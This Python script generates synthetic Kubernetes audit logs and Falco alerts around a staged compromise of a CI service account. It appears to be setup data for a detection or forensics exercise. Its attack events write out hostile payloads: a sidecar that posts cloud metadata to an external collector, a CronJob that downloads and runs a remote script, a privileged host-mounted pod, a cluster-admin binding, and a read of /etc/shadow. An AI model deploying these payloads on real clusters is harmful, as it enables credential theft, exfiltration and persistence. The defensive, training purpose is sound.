#!/usr/bin/env python3
"""Generate realistic Kubernetes audit logs and Falco alerts with an embedded multi-stage attack.

Attack Scenario: "Operation Shadow Pipeline"
A CI service account token (pipeline:ci-bot) has been compromised. The attacker uses it
to perform reconnaissance, steal credentials, escalate privileges, and establish persistence.
"""
import json
import os

def ensure_dir(path):
    os.makedirs(path, exist_ok=True)

# ==================== USER DEFINITIONS ====================

USERS = {
    "ci-bot": {
        "username": "system:serviceaccount:pipeline:ci-bot",
        "uid": "sa-uid-ci-bot-7890abcd",
        "groups": ["system:serviceaccounts", "system:serviceaccounts:pipeline", "system:authenticated"]
    },
    "deploy-bot": {
        "username": "system:serviceaccount:production:deploy-bot",
        "uid": "sa-uid-deploy-bot-1234efgh",
        "groups": ["system:serviceaccounts", "system:serviceaccounts:production", "system:authenticated"]
    },
    "prometheus": {
        "username": "system:serviceaccount:monitoring:prometheus-sa",
        "uid": "sa-uid-prometheus-5678ijkl",
        "groups": ["system:serviceaccounts", "system:serviceaccounts:monitoring", "system:authenticated"]
    },
    "admin": {
        "username": "admin@cluster.local",
        "uid": "user-uid-admin-0000mnop",
        "groups": ["system:masters", "system:authenticated"]
    },
    "node1": {
        "username": "system:node:node-1",
        "uid": "node-uid-1",
        "groups": ["system:nodes", "system:authenticated"]
    },
    "node2": {
        "username": "system:node:node-2",
        "uid": "node-uid-2",
        "groups": ["system:nodes", "system:authenticated"]
    },
    "kcm": {
        "username": "system:kube-controller-manager",
        "uid": "system-uid-kcm",
        "groups": ["system:authenticated"]
    },
    "sched": {
        "username": "system:kube-scheduler",
        "uid": "system-uid-sched",
        "groups": ["system:authenticated"]
    },
}

# ==================== CONSTANTS ====================

UA_CI_LEGIT = "ci-runner/v2.3.1 (linux/amd64) pipeline-controller"
UA_CI_ATTACK = "kubectl/v1.29.2 (linux/amd64) kubernetes/abc1234"
UA_DEPLOY = "argocd-application-controller/v2.10.0 (linux/amd64)"
UA_PROM = "prometheus-operator/v0.73.0 (linux/amd64)"
UA_ADMIN = "kubectl/v1.29.0 (linux/amd64) kubernetes/def5678"
UA_KUBELET = "kubelet/v1.29.0 (linux/amd64) kubernetes/def5678"
UA_KCM = "kube-controller-manager/v1.29.0 (linux/amd64) kubernetes/def5678"
UA_SCHED = "kube-scheduler/v1.29.0 (linux/amd64) kubernetes/def5678"

IP_CI_LEGIT = "10.0.5.20"
IP_CI_ATTACK = "10.0.2.15"
IP_DEPLOY = "10.0.4.10"
IP_PROM = "10.0.3.5"
IP_ADMIN = "192.168.1.100"
IP_NODE1 = "10.0.1.1"
IP_NODE2 = "10.0.1.2"


# ==================== EVENT BUILDER ====================

def evt(audit_id, timestamp, verb, resource, namespace, name,
        user_key, source_ip, user_agent, status_code=200,
        api_group="", api_version="v1", level="Metadata",
        request_object=None, annotations=None, subresource=None):

    if api_group:
        uri = "/apis/{}/{}".format(api_group, api_version)
    else:
        uri = "/api/{}".format(api_version)
    if namespace:
        uri += "/namespaces/{}".format(namespace)
    uri += "/{}".format(resource)
    if name:
        uri += "/{}".format(name)
    if subresource:
        uri += "/{}".format(subresource)

    event = {
        "kind": "Event",
        "apiVersion": "audit.k8s.io/v1",
        "level": level if not request_object else "RequestResponse",
        "auditID": audit_id,
        "stage": "ResponseComplete",
        "requestURI": uri,
        "verb": verb,
        "user": USERS[user_key],
        "sourceIPs": [source_ip],
        "userAgent": user_agent,
        "objectRef": {
            "resource": resource,
            "namespace": namespace if namespace else "",
            "name": name if name else "",
            "apiVersion": api_version,
            "apiGroup": api_group,
        },
        "responseStatus": {"metadata": {}, "code": status_code},
        "requestReceivedTimestamp": "2024-03-15T{}Z".format(timestamp),
        "stageTimestamp": "2024-03-15T{}Z".format(timestamp),
    }
    if request_object:
        event["requestObject"] = request_object
    if annotations:
        event["annotations"] = annotations
    return event


# ==================== GENERATE AUDIT EVENTS ====================

events = []

# --- Normal: kubelet node status updates ---
events.append(evt("b0000001-1111-2222-3333-444444444444", "10:00:15.123456",
    "patch", "nodes", "", "node-1", "node1", IP_NODE1, UA_KUBELET, subresource="status"))
events.append(evt("b0000002-1111-2222-3333-444444444444", "10:01:45.456789",
    "patch", "nodes", "", "node-2", "node2", IP_NODE2, UA_KUBELET, subresource="status"))

# --- Normal: monitoring lists pods (periodic cluster-wide) ---
events.append(evt("c0000001-1111-2222-3333-444444444444", "10:01:03.789012",
    "list", "pods", "", "", "prometheus", IP_PROM, UA_PROM))

# --- Normal: ci-bot lists pods in pipeline namespace (legitimate) ---
events.append(evt("d0000001-1111-2222-3333-444444444444", "10:02:12.012345",
    "list", "pods", "pipeline", "", "ci-bot", IP_CI_LEGIT, UA_CI_LEGIT))

# --- Normal: scheduler binds pod ---
events.append(evt("e0000001-1111-2222-3333-444444444444", "10:02:30.345678",
    "create", "pods", "production", "frontend-7b8c9d-x2k4m", "sched", IP_NODE1, UA_SCHED,
    subresource="binding"))

# --- Normal: deploy-bot checks frontend deployment ---
events.append(evt("f0000001-1111-2222-3333-444444444444", "10:03:22.678901",
    "get", "deployments", "production", "frontend", "deploy-bot", IP_DEPLOY, UA_DEPLOY,
    api_group="apps"))

# --- Normal: kubelet status ---
events.append(evt("b0000003-1111-2222-3333-444444444444", "10:03:45.901234",
    "patch", "nodes", "", "node-1", "node1", IP_NODE1, UA_KUBELET, subresource="status"))

# --- Normal: deploy-bot updates frontend deployment (legitimate rollout) ---
events.append(evt("f0000002-1111-2222-3333-444444444444", "10:04:11.234567",
    "patch", "deployments", "production", "frontend", "deploy-bot", IP_DEPLOY, UA_DEPLOY,
    api_group="apps", level="Request",
    annotations={"authorization.k8s.io/decision": "allow",
                 "authorization.k8s.io/reason": "RBAC: allowed by RoleBinding \"deploy-bot-binding\" of Role \"deployment-manager\" to ServiceAccount \"deploy-bot/production\""}))

# --- Normal: controller-manager creates replicaset from deploy-bot's update ---
events.append(evt("g0000001-1111-2222-3333-444444444444", "10:04:32.567890",
    "create", "replicasets", "production", "frontend-8c9d0e", "kcm", IP_NODE1, UA_KCM,
    api_group="apps"))

# --- Normal: scheduler binds new pod ---
events.append(evt("e0000002-1111-2222-3333-444444444444", "10:04:48.890123",
    "create", "pods", "production", "frontend-8c9d0e-p3q5r", "sched", IP_NODE1, UA_SCHED,
    subresource="binding"))

# --- Normal: ci-bot creates build pod in pipeline (legitimate CI job) ---
events.append(evt("d0000002-1111-2222-3333-444444444444", "10:05:05.123456",
    "create", "pods", "pipeline", "build-job-1234", "ci-bot", IP_CI_LEGIT, UA_CI_LEGIT))

# ============ ATTACK BEGINS ============

# ATK-001: ci-bot lists pods across ALL namespaces (reconnaissance)
events.append(evt("7f3a9c1e-2b4d-4e6f-8a0c-1d3e5f7a9b0d", "10:05:47.456789",
    "list", "pods", "", "", "ci-bot", IP_CI_ATTACK, UA_CI_ATTACK,
    annotations={"authorization.k8s.io/decision": "allow",
                 "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"ci-pipeline-binding\" of ClusterRole \"ci-pipeline-reader\" to ServiceAccount \"ci-bot/pipeline\""}))

# --- Normal: monitoring lists pods (periodic) ---
events.append(evt("c0000002-1111-2222-3333-444444444444", "10:06:02.789012",
    "list", "pods", "", "", "prometheus", IP_PROM, UA_PROM))

# ATK-002: ci-bot tries to list secrets in kube-system → FORBIDDEN
events.append(evt("8e4b0d2f-3c5e-4f7a-9b1d-2e4f6a8c0d1e", "10:06:33.012345",
    "list", "secrets", "kube-system", "", "ci-bot", IP_CI_ATTACK, UA_CI_ATTACK,
    status_code=403,
    annotations={"authorization.k8s.io/decision": "forbid",
                 "authorization.k8s.io/reason": "RBAC: no rules matched"}))

# ATK-003: ci-bot lists secrets in production → SUCCESS
events.append(evt("9d5c1e3a-4d6f-4a8b-0c2e-3f5a7b9d1e2f", "10:07:12.345678",
    "list", "secrets", "production", "", "ci-bot", IP_CI_ATTACK, UA_CI_ATTACK,
    annotations={"authorization.k8s.io/decision": "allow",
                 "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"ci-pipeline-binding\" of ClusterRole \"ci-pipeline-reader\" to ServiceAccount \"ci-bot/pipeline\""}))

# --- Normal: kubelet status ---
events.append(evt("b0000004-1111-2222-3333-444444444444", "10:07:45.678901",
    "patch", "nodes", "", "node-2", "node2", IP_NODE2, UA_KUBELET, subresource="status"))

# ATK-004: ci-bot reads secret db-credentials in production
events.append(evt("0e6d2f4b-5e7a-4b9c-1d3f-4a6b8c0e2f3a", "10:08:03.901234",
    "get", "secrets", "production", "db-credentials", "ci-bot", IP_CI_ATTACK, UA_CI_ATTACK,
    annotations={"authorization.k8s.io/decision": "allow",
                 "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"ci-pipeline-binding\" of ClusterRole \"ci-pipeline-reader\" to ServiceAccount \"ci-bot/pipeline\""}))

# ATK-005: ci-bot reads secret api-keys in production
events.append(evt("1f7e3a5c-6f8b-4c0d-2e4a-5b7c9d1f3a4b", "10:08:28.234567",
    "get", "secrets", "production", "api-keys", "ci-bot", IP_CI_ATTACK, UA_CI_ATTACK,
    annotations={"authorization.k8s.io/decision": "allow",
                 "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"ci-pipeline-binding\" of ClusterRole \"ci-pipeline-reader\" to ServiceAccount \"ci-bot/pipeline\""}))

# --- Normal: admin lists nodes ---
events.append(evt("h0000001-1111-2222-3333-444444444444", "10:09:15.567890",
    "list", "nodes", "", "", "admin", IP_ADMIN, UA_ADMIN))

# --- Normal: ci-bot reads configmap in pipeline (legitimate) ---
events.append(evt("d0000003-1111-2222-3333-444444444444", "10:10:33.890123",
    "get", "configmaps", "pipeline", "ci-config", "ci-bot", IP_CI_LEGIT, UA_CI_LEGIT))

# --- Normal: monitoring lists pods (periodic) ---
events.append(evt("c0000003-1111-2222-3333-444444444444", "10:11:00.123456",
    "list", "pods", "", "", "prometheus", IP_PROM, UA_PROM))

# --- Normal: kubelet status ---
events.append(evt("b0000005-1111-2222-3333-444444444444", "10:11:30.456789",
    "patch", "nodes", "", "node-1", "node1", IP_NODE1, UA_KUBELET, subresource="status"))

# --- Normal: admin creates configmap (routine admin work) ---
events.append(evt("h0000002-1111-2222-3333-444444444444", "10:12:10.789012",
    "create", "configmaps", "default", "app-settings", "admin", IP_ADMIN, UA_ADMIN))

# ATK-006: ci-bot creates ClusterRoleBinding for privilege escalation
events.append(evt("2a8f4b6d-7a9c-4d1e-3f5b-6c8d0e2a4b5c", "10:12:55.012345",
    "create", "clusterrolebindings", "", "system:controller:ci-pipeline-admin",
    "ci-bot", IP_CI_ATTACK, UA_CI_ATTACK,
    api_group="rbac.authorization.k8s.io",
    request_object={
        "apiVersion": "rbac.authorization.k8s.io/v1",
        "kind": "ClusterRoleBinding",
        "metadata": {"name": "system:controller:ci-pipeline-admin"},
        "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "cluster-admin"},
        "subjects": [{"kind": "ServiceAccount", "name": "ci-bot", "namespace": "pipeline"}]
    }))

# --- Normal: admin gets clusterrole ---
events.append(evt("h0000003-1111-2222-3333-444444444444", "10:13:22.345678",
    "get", "clusterroles", "", "admin", "admin", IP_ADMIN, UA_ADMIN,
    api_group="rbac.authorization.k8s.io"))

# --- Normal: kubelet status ---
events.append(evt("b0000006-1111-2222-3333-444444444444", "10:14:00.678901",
    "patch", "nodes", "", "node-2", "node2", IP_NODE2, UA_KUBELET, subresource="status"))

# --- Normal: deploy-bot reads endpoints ---
events.append(evt("f0000003-1111-2222-3333-444444444444", "10:14:30.901234",
    "list", "endpoints", "production", "", "deploy-bot", IP_DEPLOY, UA_DEPLOY))

# ATK-007: ci-bot creates privileged pod in kube-system
events.append(evt("3b9a5c7e-8b0d-4e2f-4a6c-7d9e1f3b5c6d", "10:15:31.234567",
    "create", "pods", "kube-system", "troubleshoot-node",
    "ci-bot", IP_CI_ATTACK, UA_CI_ATTACK,
    request_object={
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": "troubleshoot-node", "namespace": "kube-system"},
        "spec": {
            "hostPID": True,
            "hostNetwork": True,
            "containers": [{
                "name": "debug",
                "image": "alpine:3.19",
                "command": ["/bin/sh", "-c", "sleep 3600"],
                "securityContext": {"privileged": True},
                "volumeMounts": [{"name": "host-root", "mountPath": "/host"}]
            }],
            "volumes": [{"name": "host-root", "hostPath": {"path": "/", "type": "Directory"}}]
        }
    }))

# --- Normal: monitoring lists pods (periodic) ---
events.append(evt("c0000004-1111-2222-3333-444444444444", "10:16:00.567890",
    "list", "pods", "", "", "prometheus", IP_PROM, UA_PROM))

# --- Normal: deploy-bot checks backend-api deployment ---
events.append(evt("f0000004-1111-2222-3333-444444444444", "10:16:45.890123",
    "get", "deployments", "production", "backend-api", "deploy-bot", IP_DEPLOY, UA_DEPLOY,
    api_group="apps"))

# --- Normal: kubelet status ---
events.append(evt("b0000007-1111-2222-3333-444444444444", "10:17:30.123456",
    "patch", "nodes", "", "node-1", "node1", IP_NODE1, UA_KUBELET, subresource="status"))

# --- Normal: admin lists services ---
events.append(evt("h0000004-1111-2222-3333-444444444444", "10:18:00.456789",
    "list", "services", "production", "", "admin", IP_ADMIN, UA_ADMIN))

# ATK-008: ci-bot patches deployment to inject exfiltration sidecar
events.append(evt("4c0b6d8f-9c1e-4f3a-5b7d-8e0f2a4c6d7e", "10:18:44.789012",
    "patch", "deployments", "production", "backend-api",
    "ci-bot", IP_CI_ATTACK, UA_CI_ATTACK,
    api_group="apps",
    request_object={
        "spec": {
            "template": {
                "spec": {
                    "containers": [
                        {"name": "backend-api", "image": "internal-registry.corp/backend-api:v2.1.0"},
                        {"name": "metrics-exporter", "image": "alpine:3.19",
                         "command": ["/bin/sh", "-c",
                                     "while true; do curl -s http://169.254.169.254/latest/meta-data/ > /tmp/meta.txt; "
                                     "curl -X POST -d @/tmp/meta.txt https://collector.external-domain.com/ingest; sleep 300; done"],
                         "env": [{"name": "COLLECTOR_URL", "value": "https://collector.external-domain.com"}]}
                    ]
                }
            }
        }
    }))

# --- Normal: controller-manager creates new replicaset (consequence of ATK-008) ---
events.append(evt("g0000002-1111-2222-3333-444444444444", "10:19:15.012345",
    "create", "replicasets", "production", "backend-api-9e0f1a", "kcm", IP_NODE1, UA_KCM,
    api_group="apps"))

# --- Normal: kubelet status ---
events.append(evt("b0000008-1111-2222-3333-444444444444", "10:20:00.345678",
    "patch", "nodes", "", "node-2", "node2", IP_NODE2, UA_KUBELET, subresource="status"))

# --- Normal: deploy-bot sees the changed deployment ---
events.append(evt("f0000005-1111-2222-3333-444444444444", "10:20:30.678901",
    "get", "deployments", "production", "backend-api", "deploy-bot", IP_DEPLOY, UA_DEPLOY,
    api_group="apps"))

# --- Normal: monitoring lists pods (periodic) ---
events.append(evt("c0000005-1111-2222-3333-444444444444", "10:21:00.901234",
    "list", "pods", "", "", "prometheus", IP_PROM, UA_PROM))

# --- Normal: ci-bot deletes completed build pod in pipeline (legitimate) ---
events.append(evt("d0000004-1111-2222-3333-444444444444", "10:21:30.234567",
    "delete", "pods", "pipeline", "build-job-1234", "ci-bot", IP_CI_LEGIT, UA_CI_LEGIT))

# ATK-009: ci-bot creates CronJob for persistence
events.append(evt("5d1c7e9a-0d2f-4a4b-6c8e-9f1a3b5d7e8f", "10:22:17.567890",
    "create", "cronjobs", "production", "log-rotation",
    "ci-bot", IP_CI_ATTACK, UA_CI_ATTACK,
    api_group="batch",
    request_object={
        "apiVersion": "batch/v1",
        "kind": "CronJob",
        "metadata": {"name": "log-rotation", "namespace": "production"},
        "spec": {
            "schedule": "*/15 * * * *",
            "jobTemplate": {
                "spec": {
                    "template": {
                        "spec": {
                            "containers": [{
                                "name": "rotator",
                                "image": "alpine:3.19",
                                "command": ["/bin/sh", "-c",
                                            "wget -q -O /tmp/update.sh https://collector.external-domain.com/payload && sh /tmp/update.sh"],
                            }],
                            "restartPolicy": "OnFailure",
                            "serviceAccountName": "ci-bot"
                        }
                    }
                }
            }
        }
    }))

# --- Normal: kubelet status ---
events.append(evt("b0000009-1111-2222-3333-444444444444", "10:23:00.890123",
    "patch", "nodes", "", "node-1", "node1", IP_NODE1, UA_KUBELET, subresource="status"))

# --- Normal: admin lists deployments ---
events.append(evt("h0000005-1111-2222-3333-444444444444", "10:24:15.123456",
    "list", "deployments", "production", "", "admin", IP_ADMIN, UA_ADMIN, api_group="apps"))

# --- Normal: ci-bot lists pods in pipeline (legitimate) ---
events.append(evt("d0000005-1111-2222-3333-444444444444", "10:25:45.456789",
    "list", "pods", "pipeline", "", "ci-bot", IP_CI_LEGIT, UA_CI_LEGIT))

# --- Normal: kubelet status ---
events.append(evt("b0000010-1111-2222-3333-444444444444", "10:26:00.789012",
    "patch", "nodes", "", "node-2", "node2", IP_NODE2, UA_KUBELET, subresource="status"))

# --- Normal: monitoring lists pods (periodic) ---
events.append(evt("c0000006-1111-2222-3333-444444444444", "10:26:05.012345",
    "list", "pods", "", "", "prometheus", IP_PROM, UA_PROM))

# --- Normal: deploy-bot lists services ---
events.append(evt("f0000006-1111-2222-3333-444444444444", "10:27:00.345678",
    "list", "services", "production", "", "deploy-bot", IP_DEPLOY, UA_DEPLOY))

# --- Normal: admin gets namespace ---
events.append(evt("h0000006-1111-2222-3333-444444444444", "10:28:00.678901",
    "get", "namespaces", "", "production", "admin", IP_ADMIN, UA_ADMIN))

# Sort by timestamp
events.sort(key=lambda e: e["requestReceivedTimestamp"])


# ==================== GENERATE FALCO ALERTS ====================

falco_events = [
    {
        "output": "10:15:35.000000000: Warning Shell spawned in a container (user=root container_id=abc123def456 container_name=debug image=alpine:3.19 shell=sh parent=runc cmdline=sh -c sleep 3600)",
        "priority": "Warning",
        "rule": "Terminal shell in container",
        "time": "2024-03-15T10:15:35.000000000Z",
        "output_fields": {
            "container.id": "abc123def456",
            "container.name": "debug",
            "evt.time": "10:15:35.000000000",
            "proc.cmdline": "sh -c sleep 3600",
            "proc.name": "sh",
            "proc.pname": "runc",
            "user.name": "root",
            "container.image.repository": "alpine",
            "container.image.tag": "3.19"
        }
    },
    {
        "output": "10:15:42.000000000: Error Read sensitive file untouched by package management (user=root command=cat /etc/shadow container=debug (id=abc123def456) image=alpine:3.19)",
        "priority": "Error",
        "rule": "Read sensitive file untouched by package management",
        "time": "2024-03-15T10:15:42.000000000Z",
        "output_fields": {
            "container.id": "abc123def456",
            "container.name": "debug",
            "evt.time": "10:15:42.000000000",
            "fd.name": "/etc/shadow",
            "proc.cmdline": "cat /etc/shadow",
            "user.name": "root"
        }
    },
    {
        "output": "10:16:15.000000000: Notice Outbound connection to cloud metadata service from container (user=root command=curl http://169.254.169.254/latest/meta-data/ container=debug (id=abc123def456))",
        "priority": "Notice",
        "rule": "Contact cloud metadata service from container",
        "time": "2024-03-15T10:16:15.000000000Z",
        "output_fields": {
            "container.id": "abc123def456",
            "container.name": "debug",
            "evt.time": "10:16:15.000000000",
            "fd.name": "169.254.169.254:80",
            "proc.cmdline": "curl http://169.254.169.254/latest/meta-data/",
            "user.name": "root"
        }
    },
    {
        "output": "10:19:30.000000000: Warning Unexpected outbound connection to external domain (user=root command=curl -X POST https://collector.external-domain.com/ingest container=metrics-exporter (id=def789ghi012))",
        "priority": "Warning",
        "rule": "Unexpected outbound connection destination",
        "time": "2024-03-15T10:19:30.000000000Z",
        "output_fields": {
            "container.id": "def789ghi012",
            "container.name": "metrics-exporter",
            "evt.time": "10:19:30.000000000",
            "fd.name": "collector.external-domain.com:443",
            "proc.cmdline": "curl -X POST https://collector.external-domain.com/ingest",
            "user.name": "root"
        }
    },
    {
        "output": "10:22:25.000000000: Notice Package management process launched in container (user=root command=wget -q -O /tmp/update.sh https://collector.external-domain.com/payload container=rotator (id=jkl345mno678))",
        "priority": "Notice",
        "rule": "Launch Package Management Process in Container",
        "time": "2024-03-15T10:22:25.000000000Z",
        "output_fields": {
            "container.id": "jkl345mno678",
            "container.name": "rotator",
            "evt.time": "10:22:25.000000000",
            "proc.cmdline": "wget -q -O /tmp/update.sh https://collector.external-domain.com/payload",
            "user.name": "root"
        }
    }
]


# ==================== WRITE FILES ====================

ensure_dir("/app/audit-logs")
ensure_dir("/app/falco-events")

with open("/app/audit-logs/kube-apiserver-audit.json", "w") as f:
    json.dump(events, f, indent=2)

with open("/app/falco-events/alerts.jsonl", "w") as f:
    for ev in falco_events:
        f.write(json.dumps(ev) + "\n")

print("Generated {} audit events and {} Falco alerts".format(len(events), len(falco_events)))
